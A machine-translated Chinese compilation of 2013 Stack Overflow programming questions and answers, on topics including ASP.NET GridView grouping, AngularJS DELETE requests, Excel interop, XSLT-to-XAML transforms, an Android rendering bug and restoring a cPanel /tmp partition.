这是一个简单的方法。它使用循环，但应该很快，因为单元数组`B`是使用反向索引技巧预先分配的。

```
for key = fliplr(unique(A(:,2)'))
    ndx = A(:,2) == key;
    B{key} = A(ndx,1)';
end 
```

# c# - Gridview 将相似的行合二为一

> ID：15159208
> 
> 赞同：4
> 
> 时间：2013-03-01T13:42:54.167
> 
> 标签：c#, asp.net, gridview

我有一个 gridview，它使用`EntityDataSource`. 我仅使用 db 中与 where 子句相对应的项目填充 gridview。

```
FRUIT       COLOR   NUMB.SEEDS
ORANGE      ORANGE  3
APPLE       RED     4
ORANGE      ORANGE  2
STRAWBERRY  RED     0 
```

我想要的是对 NUMB.SEEDS 的相似行求和，如下所示：

```
FRUIT       COLOR   NUMB.SEEDS
ORANGE      ORANGE  5
APPLE       RED     4
STRAWBERRY  RED     0 
```

请给点提示？我不知道从哪里开始。

这是我放置 where 子句的地方：

```
<asp:EntityDataSource ID="MyEfDataSource"
    runat="server" ContextTypeName="MyContext"
    EntitySetName="Fruits" EntityTypeFilter="Fruit"
    AutoPage="true" AutoSort="true" Where="it.idName = @idName">
    <WhereParameters>
        <asp:ControlParameter ControlID="ddlFruit" PropertyName="SelectedValue" Type="Int32" DefaultValue="0" Name="idName" />
    </WhereParameters>
    </asp:EntityDataSource> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:58:50.660

在 SQL 中，您将使用`GROUP BY`子句。我认为这应该适用于`EntityDataSource`：

```
<asp:EntityDataSource ID="MyEfDataSource"
    runat="server" ContextTypeName="MyContext"
    EntitySetName="Fruits" EntityTypeFilter="Fruit"
    AutoPage="true" AutoSort="true" 
    Select="it.FRUIT, it.COLOR, SUM(it.[NUMB.SEEDS])"
    Where="it.idName = @idName"
    GroupBy"it.FRUIT, it.COLOR" >
    <WhereParameters>
        <asp:ControlParameter ControlID="ddlFruit" PropertyName="SelectedValue" Type="Int32" DefaultValue="0" Name="idName" />
    </WhereParameters>
    </asp:EntityDataSource> 
```

*请注意，我根据您在问题中输入的列在“选择”和“位置”表达式中调用您的字段。它们在您的实际数据源中可能有所不同。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:59:44.120

您可以使用该`QueryCreated`事件。

```
<asp:EntityDataSource ID="EntityDataSource1" runat="server" 
    ConnectionString="name=AdventureWorksEntities" 
    DefaultContainerName="AdventureWorksEntities" EnableFlattening="False" 
    EntitySetName="FRUITS" 
    onquerycreated="EntityDataSource1_QueryCreated">
</asp:EntityDataSource>

protected void EntityDataSource1_QueryCreated(object sender, QueryCreatedEventArgs e)
{
    var fruits = e.Query.Cast<Fruits>();
    e.Query = fruits.GroupBy(fruit => fruit.COLOR)
                     .Select(group => new { FRUIT, COLOR,   group.Sum(fruit => fruit.SEEDS)});;  
} 
```

请参阅：[将 LINQ 查询应用于 EntityDataSource](http://msdn.microsoft.com/en-us/library/ee404748%28v=vs.100%29.aspx)

# javascript - 如何编写无法关闭的弹出窗口？

> ID：15159211
> 
> 赞同：0
> 
> 时间：2013-03-01T13:43:00.390
> 
> 标签：javascript, popup

作为我正在尝试做的艺术项目的一部分，我想实现一个不可关闭的弹出窗口。我正在研究一个框的概念（我已经在 CSS 中制作），单击它会打开一个无法关闭的弹出窗口，除非用户执行所需的操作（在这种情况下：在画布上绘图）。我希望有一个按钮，点击时：1）关闭弹出窗口。2) 强制将图纸下载到计算机。

我设法制作了一个弹出窗口（尺寸正确，位置正确等）。我还制作了一个按钮，单击该按钮会关闭弹出窗口。但是，当用户尝试单击角落中的红色 X 时，我似乎仍然无法让弹出窗口保持不变......我注意到无法关闭的弹出窗口在 Chrome 中并不能真正工作，但我仍然希望它是理论上无法关闭，因为它对理解我的艺术至关重要。

除非用户提交他/她的“绘画艺术”，否则我怎样才能让它不断回来？

提前致谢！非常感激。如果代码有效，我一定会在上面写上你的名字。

PS：如果有人知道任何会强制从画布下载绘图的代码，那将非常感激。现在，我只能转到另一个页面，我们必须右键单击 --> 将图像另存为 --> 等

谢谢！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T09:18:12.183

您无法真正创建“无法关闭”的弹出窗口。但是，您可以用灯箱覆盖整个页面。作为概念证明，我在 jQuery 的帮助下将其结合在一起。这是非常基本的，需要相当多的命名空间/清理/等。[http://jsfiddle.net/CJCQQ/](http://jsfiddle.net/CJCQQ/)

CSS：

```
#page-cover {
    background-color: #888; 
    display: none; 
    position: absolute; 
    width: 100%; 
    height: 100%
}
#uncloseable-lightbox {
    background-color: #000;
    height: 200px;
    position: absolute;
    left: 10px;
    top: 10px;
    width: 500px;
}
#uncloseable-lightbox button { position: absolute }
#uncloseable-lightbox #close-button { top: 10px; right: 10px;}
#uncloseable-lightbox #click-first-button { bottom: 10px; left: 10px;} 
```

HTML：

```
<div id="page-cover">
    <div id="uncloseable-lightbox">
        <button id="close-button">close</button>
        <button id="click-first-button">Click Me First</button>
    </div>
</div>
<button id="open-button">Open</button> 
```

JS：

```
$(document).ready(function () {
    var outerThis = this, canClose = false;
    $('#open-button').on('click', function (e) {
        e.preventDefault();
        $('#page-cover').show();
    });

    $('#close-button').on('click', function (e) {
        e.preventDefault();
        if(outerThis.canClose) {
            $('#page-cover').hide();
            outerThis.canClose = false;
        }
    });

    $('#click-first-button').on('click', function (e) {
        outerThis.canClose = true;
    });
}); 
```

# javascript - 发送带有 DELETE 请求的正文的干净方法是什么？

> ID：15159213
> 
> 赞同：25
> 
> 时间：2013-03-01T13:43:08.160
> 
> 标签：javascript, angularjs, angular-resource

[我需要使用$resource](http://docs.angularjs.org/api/ngResource.$resource)发送带有我的 DELETE 请求的请求正文

我能看到的唯一方法是改变：

[https://github.com/angular/angular.js/blob/master/src/ngResource/resource.js](https://github.com/angular/angular.js/blob/master/src/ngResource/resource.js)

**从**

```
var hasBody = action.method == 'POST' || action.method == 'PUT' || action.method == 'PATCH'; 
```

**到**

```
var hasBody = action.method == 'POST' || action.method == 'PUT' || action.method == 'PATCH' || action.method == 'DELETE'; 
```

有没有更好的方法来覆盖它？就像您更改内容类型标题一样，您可以执行以下操作：

```
$httpProvider.defaults.headers["delete"] = {'Content-Type': 'application/json;charset=utf-8'}; 
```

或类似的东西......我用谷歌搜索了这个，但也许我错过了一些明显的东西（不是第一次）。感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-11-10T19:24:23.693

这行得通。

```
$scope.delete = function(object) {
    $http({
        url: 'domain/resource',
        method: 'DELETE',
        data: {
            id: object.id
        },
        headers: {
            "Content-Type": "application/json;charset=utf-8"
        }
    }).then(function(res) {
        console.log(res.data);
    }, function(error) {
        console.log(error);
    });
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T13:53:11.250

您可以将（[http://docs.angularjs.org/api/ng.%24http#Usage ）组件](http://docs.angularjs.org/api/ng.%24http#Usage)*注入*您的控制器之一，并按如下方式使用它：`$http`

```
$http({method: 'DELETE', url: 'www.url.com', headers: {'X-MY-HEADER': 'MY_VALUE'}}); 
```

我希望这是你所期望的。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2014-09-05T08:54:09.113

您应该能够按照文档[https://docs.angularjs.org/api/ngResource/service/](https://docs.angularjs.org/api/ngResource/service/) $resource中的说明对您的资源调用“删除”

# iphone - 如何在 Titanium iphone 应用程序中集成 Google Analytics

> ID：15159214
> 
> 赞同：4
> 
> 时间：2013-03-01T13:43:07.780
> 
> 标签：iphone, google-analytics, titanium-mobile, titanium-alloy

如何在钛 iPhone 应用程序中集成谷歌分析。我使用以下链接尝试了谷歌分析。

[https://github.com/rogchap/Titanium-Google-Analytics/blob/master/Resources/app.js](https://github.com/rogchap/Titanium-Google-Analytics/blob/master/Resources/app.js)

但它不适合我。我找不到问题。

**注意：我正在使用合金。**

请建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T21:37:46.773

如果您根据以下问题在谷歌分析中将您的应用程序设置为移动设备，您似乎必须等待更新。看来我们现在需要在 GA 中将我们的钛合金 apss 设置为网站：

[https://github.com/rogchap/Titanium-Google-Analytics/issues/11](https://github.com/rogchap/Titanium-Google-Analytics/issues/11)

# c# - Excel 互操作加载模板到现有工作簿

> ID：15159216
> 
> 赞同：1
> 
> 时间：2013-03-01T13:43:08.520
> 
> 标签：c#, excel, interop

如何将模板中的工作表加载到现有的 Excel 工作簿中（如果没有现有的工作簿，则先创建一个空白工作簿）。

我试过了

```
Excel.Application.Workbooks.Open("path"); 
```

这有效，但每次它在创建新工作簿时创建一个新的 Excel 会话。我无法通过 Google 找到任何关于如何将数据作为新工作表加载到现有书籍中的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T21:52:48.080

正如您所发现的，只需调用`Open()`工作簿就会创建一个新的 Excel 实例，而不会连接到当前正在运行的实例。你需要的要复杂得多。下面是我用来连接到工作簿的方法，您已经知道它的名称（您也可以调整它以允许用户选择他们想要打开的工作簿）：

```
private Excel.Workbook GetWorkbook(string workbookName)
{
    Excel.Window window = null;      // Excel window object from which application is grabbed
    Excel.Application app = null;    // Excel instance from which we get all the open workbooks
    Excel.Workbooks wbs = null;      // List of workbooks
    Excel.Workbook wb = null;        // Workbook to return
    EnumChildCallback cb;            // Callback routine for child window enumeration routine
    List<Process> procs = new List<Process>();           // List of processes

    // Get a full list of all processes that have a name of "excel"

    procs.AddRange(Process.GetProcessesByName("excel"));

    foreach (Process proc in procs)
    {
        // Make sure we have a valid handle for the window

        if ((int)proc.MainWindowHandle > 0)
        {
            // Get the handle of the child window in the current Excel process

            int childWindow = 0;
            cb = new EnumChildCallback(EnumChildProc);
            EnumChildWindows((int)proc.MainWindowHandle, cb, ref childWindow);

            // Make sure we got a valid handle

            if (childWindow > 0)
            {
                // Get the address of the child window so that we can talk to it and
                // get all the workbooks

                const uint OBJID_NATIVEOM = 0xFFFFFFF0;
                Guid IID_IDispatch =
                    new Guid("{00020400-0000-0000-C000-000000000046}");
                int res = AccessibleObjectFromWindow(childWindow, OBJID_NATIVEOM,
                    IID_IDispatch.ToByteArray(), ref window);

                if (res >= 0)
                {
                    app = window.Application;
                    wbs = app.Workbooks;

                    // Loop through all the workbooks within the current Excel window
                    // to see if any match

                    for (int i = 1; i <= wbs.Count; i++)
                    {
                        wb = wbs[i];

                        if (wb.Name == workbookName)
                        {
                            break;
                        }

                        wb = null;
                    }
                }
            }
        }

        // If we've already found our workbook then there's no point in continuing
        // through the remaining processes

        if (wb != null)
        {
            break;
        }
    }

    Release(wbs);
    Release(app);
    Release(window);

    return wb;
} 
```

上面调用的`Release()`方法只是将引用设置为 null 并调用`Marshal.FinalReleaseComObject()`它们，否则你最终会得到到处都是无头的 Excel 实例。

您还需要以下内容来执行一些抓取窗口的功能：

```
private delegate bool EnumChildCallback(int hwnd, ref int lParam);

[DllImport("User32.dll")]
private static extern bool EnumChildWindows(int hWndParent, EnumChildCallback lpEnumFunc, ref int lParam);

[DllImport("Oleacc.dll")]
private static extern int AccessibleObjectFromWindow(int hwnd, uint dwObjectID, byte[] riid, ref Excel.Window ptr);

private bool EnumChildProc(int hwndChild, ref int lParam)
{
    // Get the name of the class that owns the passed-in window handle

    StringBuilder buf = new StringBuilder(128);
    GetClassName(hwndChild, buf, 128);

    // If the class name is EXCEL7 then we've got an valid Excel window

    if (buf.ToString() == "EXCEL7")
    {
        lParam = hwndChild;
        return false;
    }

    return true;
}

[DllImport("User32.dll")]
private static extern int GetClassName(int hWnd, StringBuilder lpClassName, int nMaxCount); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-03T12:06:10.340

答案（感谢 Jon49 @ NetOffice 讨论板：[http](http://netoffice.codeplex.com/discussions/434906) ://netoffice.codeplex.com/discussions/434906 ）：

> ```
> Excel.Application.Sheets.Add(Type:="TemplateWorkbookPath") 
> ```
> 
> 您可以从您当前正在使用的工作簿变量中执行此操作：
> 
> ```
> wkb.Application.Sheets.Add(Type:="TemplateWorkbookPath") 
> ```

# c# - XSL 转换 | XML 到 XAML | 将层次结构级别添加到嵌套元素

> ID：15159225
> 
> 赞同：0
> 
> 时间：2013-03-01T13:43:43.790
> 
> 标签：c#, wpf, xaml, xslt, xslt-1.0

由于 WPF 中的 GroupBox 控件仅接受一个 WPF 控件作为内容，因此我必须首先将所有属性包装到 DockPanel 控件中。

我使用以下 xsl 样式表将我的代码转换为之后显示的 XAML 代码片段样式表（片段）：

```
 <!-- Default attribute processing -->
  <xsl:template name="process-element">
    <xsl:param name="attr" />

    <!-- Process all attributes and elements which are going to be
             transformed to attributes -->
    <xsl:apply-templates select="@*|*" mode="to-attr" />
    <!-- Add extra attribute -->
    <xsl:if test="$attr">
      <xsl:attribute name="{substring-after($attr, '|')}">
        <xsl:value-of select="@*[local-name() = substring-before($attr, '|')]" />
      </xsl:attribute>
    </xsl:if>
    <!-- Process children elements -->
    <xsl:apply-templates select="*" />
  </xsl:template>

  <!-- Map GroupBoxWrapper into GroupBox -->
  <xsl:template match="GroupBoxWrapper">
    <xsl:element name="GroupBox">
      <!-- TODO: Add DockPanel Element and move "cursor" one level upwards -->
      <!--<xsl:element name="DockPanel">-->
        <xsl:call-template name="process-element">
          <xsl:with-param name="attr"/>
        </xsl:call-template>
      <!--</xsl:element>-->
    </xsl:element>
  </xsl:template> 
```

这是生成的代码 XAML：

```
<GroupBox Name="groupbox1" DockPanel.Dock="Left, Right, Top, Bottom" Width="1092" Height="125" Background="Transparent" Foreground="#0046D5" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False">
  <DockPanel Name="panel4" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
    <Label Name="lblName" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Name:" />
    <TextBox Name="txtName" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
  </DockPanel>
  <DockPanel Name="panel5" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
    <Label Name="lblLastName" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Lastname:" />
    <TextBox Name="txtLastName" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
  </DockPanel>
  <DockPanel Name="panel6" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
    <Label Name="label4" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Age:" />
    <TextBox Name="textbox3" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
  </DockPanel>
  <DockPanel Name="panel14" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
    <Label Name="label9" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Gender:" />
    <RadioButton Name="radiobutton1" DockPanel.Dock="Left" Width="75" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Content="Male" />
    <RadioButton Name="radiobutton2" DockPanel.Dock="Left" Width="75" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="2" IsTabStop="True" Content="Female" />
  </DockPanel>
</GroupBox> 
```

问题是 GroupBox 现在包含四个元素，这在 WPF 中是不可能的。这就是为什么我需要将这些控件包装到一个 DockPanel 中。

当我取消注释该`<xsl:element name="DockPanel">`行时，XAML 代码如下所示：

```
<GroupBox> <!-- attributes should appear on this line -->
      <DockPanel Name="groupbox1" DockPanel.Dock="Left, Right, Top, Bottom" Width="1092" Height="125" Background="Transparent" Foreground="#0046D5" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False">
        <DockPanel Name="panel4" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
          <Label Name="lblName" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Name:" />
          <TextBox Name="txtName" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
        </DockPanel>
        <DockPanel Name="panel5" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
          <Label Name="lblLastName" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Lastname:" />
          <TextBox Name="txtLastName" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
        </DockPanel>
        <DockPanel Name="panel6" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
          <Label Name="label4" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Age:" />
          <TextBox Name="textbox3" DockPanel.Dock="Left" Width="100" Height="25" Background="Azure" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Text="" />
        </DockPanel>
        <DockPanel Name="panel14" DockPanel.Dock="Top" Width="1078" Height="25" Background="Transparent" Visibility="visible">
          <Label Name="label9" DockPanel.Dock="Left" Width="100" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="0" IsTabStop="False" Content="Gender:" />
          <RadioButton Name="radiobutton1" DockPanel.Dock="Left" Width="75" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="1" IsTabStop="True" Content="Male" />
          <RadioButton Name="radiobutton2" DockPanel.Dock="Left" Width="75" Height="25" Background="Transparent" Foreground="Black" Visibility="visible" BorderThickness="1,1,1,1" FontFamily="Tahoma" FontSize="9" TabIndex="2" IsTabStop="True" Content="Female" />
        </DockPanel>
      </DockPanel>
    </GroupBox> 
```

GroupBox 的所有意图都在嵌套内部 GroupBox 元素的 DockPanel 元素中。

我需要弄清楚如何创建 DockPanel 元素（检查）并向上移动到 GroupBox 元素以调用流程元素模板。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T15:12:47.770

**问题**

流程元素模板旨在执行以下操作：

1.  将当前属性和当前元素的子元素转换为新元素的属性。
2.  使用 attr 参数添加额外的属性
3.  正常处理孩子。

您当前出现的问题是因为您将步骤 1 (<xsl:apply-templates select="@ *|* " mode="to-attr">) 中的属性附加到新创建的元素 DockPanel (<xsl:element name ="DockPanel">)。这就是为什么您的属性被复制到其他元素中的原因。

**解决方案**

不要依赖模板流程元素进行此转换。最初，该模板是在特定点的所有元素（[使用 XSLT 1.0 的 XML 到 XAML 转换 | 排除某些控件](https://stackoverflow.com/questions/15115826/xml-to-xaml-transformation-using-xslt-1-0-exclude-specific-transformations-for/)的特定转换）遵循不同的逻辑来保存重复代码时编写的。因此，如果您要实现的目标不遵循以前的模式，则必须修改流程模板或为 GroupBoxWrapper 元素编写不同的模板。

以下模板将解决您想要实现的目标。

```
 <!-- Map GroupBoxWrapper into GroupBox -->
  <xsl:template match="GroupBoxWrapper">
    <xsl:element name="GroupBox">
      <!-- Process attributes -->
      <xsl:apply-templates select="@*|*" mode="to-attr" />
      <!-- Create new DockPanel to wrap children -->
      <xsl:element name="DockPanel">
        <!-- Process GroupBoxWrapper chldren -->
        <xsl:apply-templates select="*" />
      </xsl:element>
    </xsl:element>
  </xsl:template> 
```

PS。我认为您应该先了解我们 [stackoverflow 上的人员] 发布的代码，然后再实际使用它，这样您就不必每次出现问题时都依赖我们。

# java - DataSource.getConnection 在 Linux 上很慢但不使用 windows

> ID：15159226
> 
> 赞同：0
> 
> 时间：2013-03-01T13:43:46.940
> 
> 标签：java, mysql, linux, tomcat

我正在使用 Java 和 axis2 框架开发一些 Web 服务。这个应用程序应该在 ubuntu 8.04 上的 tomcat 5.5 下运行，所以我有一个带有这些版本的测试服务器设置。

当我在我的 Windows 机器上进行本地开发时，从 Web 服务调用获得响应大约需要 50 毫秒。如果我在 Linux 机器上部署相同的应用程序（我尝试过 ubuntu 机器和运行 arch linux 的机器），第一次 Web 服务调用大约需要 20 秒。

我做了一些故障排除并得出结论，我的`DataSource.getConnection`通话第一次大约需要 9 秒，之后每次大约需要 5 秒。如果我启用连接池，它当然会在第一次通话后加快我的通话速度（因为保存了连接），之后的通话也需要 50 毫秒，这很好，但我希望有一个更强大的解决方案来增加数量的连接池。真正困扰我的是，这在我的 Windows 机器上运行良好，但使用 Linux 会出现问题。

谁能指出我可能是什么问题的方向？我的 tomcat 日志中没有错误。

使用 Ubuntu 8.04 MySql 5.0.83 Tomcat 5.5.27 Java 6 Axis2 1.2（也试过 1.6）

# android - Android - OnDraw() 方法永远不会被调用

> ID：15159231
> 
> 赞同：1
> 
> 时间：2013-03-01T13:44:03.947
> 
> 标签：android, rendering, game-engine

我是 android 编程的新手，我不明白为什么我的渲染器中的 OnDraw() 方法没有被调用，因为 invalidate() 被调用了。然而，最终设置的背景资源确实被调用了。有 2 个类，Game.java 和 Renderer.java。似乎无效调用没有时间在游戏循环期间得到处理。

# 游戏.Java

```
public class Game extends Activity 
{
    Level currentLevel;
    private static List<Entity> _renderList = new ArrayList<Entity>();

    public void StartLevel(View view)
    {   
        System.out.println("I HAVE STARTED THE LEVEL!");
        // Hide the play button
        Button playButton = (Button) findViewById(R.id.start_game);
        playButton.setVisibility(View.GONE);
        // Load the level
        currentLevel = new Level1(this);
        // Create the initial entities

        // Add the entities to the screen   
        List<Bitmap> bitmapList;
        bitmapList = new ArrayList<Bitmap>();
        Bitmap enemy = BitmapFactory.decodeResource(getResources(), R.drawable.enemy);
        bitmapList.add(enemy);
        System.out.println("CREATING RENDERER!");
        Renderer renderer = new Renderer(this, _renderList, bitmapList);
        renderer.setBackgroundResource(R.drawable.beachbackground);
        setContentView(renderer);
        System.out.println("STARTING TRAVEL!");
        while (currentLevel.GetDistTravelled() < currentLevel.GetDist())
        {
            Retrieve();
            currentLevel.AddDistance(1);
            System.out.println("DISTANCE +1!");
            renderer.RenderFrame(_renderList);
            System.out.println("RENDER LEVEL FRAME!");
            try 
            {
                Thread.currentThread().sleep(50);
            } 
            catch (InterruptedException e) 
            {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        System.out.println("SET BACKGROUND!");
        renderer.setBackgroundResource(R.drawable.menubackground);
    }

    public List<Entity> GetRenderList()
    {
        return _renderList;
    }

    private void Retrieve()
    {
        // get the array
        Entity[] enemies;
        enemies = currentLevel.CheckSpawn();
        if(enemies != null)
        {
            // parse the array into entities
            int length = enemies.length;
            System.out.println(length);

            // remember to Get enemy strings
            for(int i = 0; i < length; i++)
            {
                // add them to our array
                _renderList.add(enemies[i]);
            }

        }
    }
} 
```

# 渲染器.java

```
class Renderer extends SurfaceView implements SurfaceHolder.Callback 
{
    PanelThread _thread;
    List<Entity> _renderList = new ArrayList<Entity>();
    List<Bitmap> _bitmapList = new ArrayList<Bitmap>();

    public Renderer(Context context, List<Entity> renderList, List<Bitmap> bitmapList)
    {   
        super(context);
        getHolder().addCallback(this);
        _bitmapList = bitmapList;
    }

    public void RenderFrame(List<Entity> renderList)
    {
        for (int i = 0; i < renderList.size(); i++)
            {
                _renderList.add(renderList.get(i));
            }
        invalidate();
    }

    @Override
    public void onDraw(Canvas canvas)
    {
        Paint paint = null;

        // Draw enemies

        if(_renderList.size() != 0 && _renderList != null)
        {
            int size = _renderList.size();
            for(int i = 0; i < size; i++)
            {
                canvas.drawBitmap(_bitmapList.get(_renderList.get(i).GetBitmapID()), _renderList.get(i).GetX(), _renderList.get(i).GetY(), paint);
            }
        }
    }

        // position the train on the screen in the appropriate place    

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height)
    {

    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) 
    {
        setWillNotDraw(false); //Allows us to use invalidate() to call onDraw()

        _thread = new PanelThread(getHolder(), this); //Start the thread that
        _thread.setRunning(true);                     //will make calls to 
        _thread.start();                              //onDraw()
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) 
    {
        try 
        {
            _thread.setRunning(false);                //Tells thread to stop
            _thread.join();                           //Removes thread from mem.
        } 
        catch (InterruptedException e) {}
    }

    class PanelThread extends Thread
    {
        private SurfaceHolder _surfaceHolder;
        private Renderer _renderer;
        private boolean _run = false;

        public PanelThread(SurfaceHolder surfaceHolder, Renderer renderer) 
        {
            _surfaceHolder = surfaceHolder;
            _renderer = renderer;
        }

        public void setRunning(boolean run) 
        {
            _run = run;
        }

        @Override
        public void run() 
        {
            Canvas c;
            while (_run) 
            {     
                c = null;

                try 
                {
                    c = _surfaceHolder.lockCanvas(null);
                    synchronized (_surfaceHolder)
                    {
                    //Insert methods to modify positions of items in onDraw()
                    postInvalidate();

                    }
                } 
                finally {
                    if (c != null) {
                        _surfaceHolder.unlockCanvasAndPost(c);
                    }
                }
            }
        }  
    }
} 
```

任何有关解决此问题的帮助将不胜感激。如果需要更多信息，请询问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T06:48:36.783

嗨，我和你有同样的错误。但我发现了。但我不清楚这一点。

但你可以试试

将属性**android:background**添​​加到您的布局中。

# linux - VPS 上丢失 tmp 目录 - /scripts/securetmp 问题

> ID：15159234
> 
> 赞同：0
> 
> 时间：2013-03-01T13:44:10.660
> 
> 标签：linux, centos, vps, tmp

我一直在尝试按照说明将我们的 VPS 上的 tmp 目录从 512mb 增加到 3gb。我成功地将securetmp中的tmpdsksize变量修改为3072000并使用vi编辑器保存了它，然后我在命令行中输入了这些行：

```
/etc/init.d/cpanel stop
/etc/init.d/httpd stop
/etc/init.d/lsws stop
/etc/init.d/mysql stop
umount -l /tmp
umount -l /var/tmp
mv /usr/tmpDSK /usr/tmpDSK_back
/scripts/securetmp
/etc/init.d/cpanel start
/etc/init.d/httpd start
/etc/init.d/lsws start
/etc/init.d/mysql start 
```

这是为了在 VPA 上重新创建您的 tmp 目录。

但是这不起作用，我现在没有 tmp 目录。VPS 工作正常，导致我尝试增加 tmp 目录大小的问题现已修复。最初的问题是在数据库上运行大型选择查询。但我担心缺少 tmp 目录，因为这不是我的意图。没有人可以跑步吗？

它没有创建一个的问题似乎归结为运行 /scripts/securetmp。

基本上，当我运行它时，会出现错误，因此不会重新创建我的 tmp 目录。我得到的错误是：

```
root [~]# /scripts/securetmp
/scripts/securetmp: line 1: !/usr/bin/perl: No such file or directory
/scripts/securetmp: line 7: syntax error near unexpected token `}'
/scripts/securetmp: line 7: `BEGIN { unshift @INC, '/usr/local/cpanel'; }'
root [~]# /scripts/securetmp: line 7: syntax error near unexpected token `}' 
```

有什么想法我哪里出错了吗？我没有大量的 Linux 经验，这是谷歌和学习的案例。我正在使用 Putty 远程访问 VPS。我用谷歌搜索了很多，但找不到关于 /scripts/securetmp 错误的很多信息。到处谈论增加 tmp 目录大小的行为就像运行该行一样。更改 tmp 目录大小时，我没有修改第 1 行和第 7 行。

VPS 运行 Cent OS 6.3。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-02T07:56:59.207

运行 scripts/securetmp 来增加我的 tmpDSK 大小也对我不起作用：该脚本只是删除了分区，所以我没有 tmpDSK！

这是在带有 WHM/cpanel 的 Xen VPS 服务器上。

经过几个小时的坚持，我发现了这个帖子： [如何增加Linux服务器中磁盘空间/tmp（/usr/tmpDSK）分区的大小](https://stackoverflow.com/questions/15159234/lost-tmp-directory-on-vps-scripts-securetmp-issues)

**我唯一需要改变的是：**

1.) 停止 MySql 服务并终止 tailwatchd 进程。
[root@server ~]# /etc/init.d/mysqld stop
[root@server ~]# kill -9 2522

至：

1.) 停止 MySql 服务并终止 tailwatchd 进程。

```
[root@server ~]# /etc/init.d/cpanel stop
[root@server ~]# /etc/init.d/mysql stop 
```

（要在完成后重新启动这些服务，请将停止更改为启动）

**同样在第 11 步**

11.) 编辑 fstab 并将 /tmp 入口行替换为：-
/usr/tmpDSK /tmp ext3 loop,noexec,nosuid,rw 0 0

以下是使用 SSH 访问和编辑讨厌的 etc/fstab 的方法：

* * *

